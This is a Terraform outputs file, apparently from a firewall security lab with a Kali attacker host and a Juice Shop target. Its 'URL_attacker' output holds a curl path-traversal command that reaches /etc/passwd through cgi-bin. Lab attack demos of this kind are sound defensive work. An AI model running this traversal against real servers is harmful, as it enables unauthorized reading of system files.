# -----------------------------------------------------------------------------------
# Outputs

output "URL_attacker" {
  value = "curl http://${module.vmseries.nic0_ips["vmseries01"]}:8080/cgi-bin/../../../..//bin/cat%20/etc/passwd"
}

output "SSH_attacker" {
  value = "ssh kali@${module.vmseries.nic0_ips["vmseries01"]}"
}

output "URL_vmseries" {
  value = "https://${module.vmseries.nic1_ips["vmseries01"]}"
}

output "URL_juiceshop" {
  value = "http://${module.vmseries.nic0_ips["vmseries01"]}:3000"
}





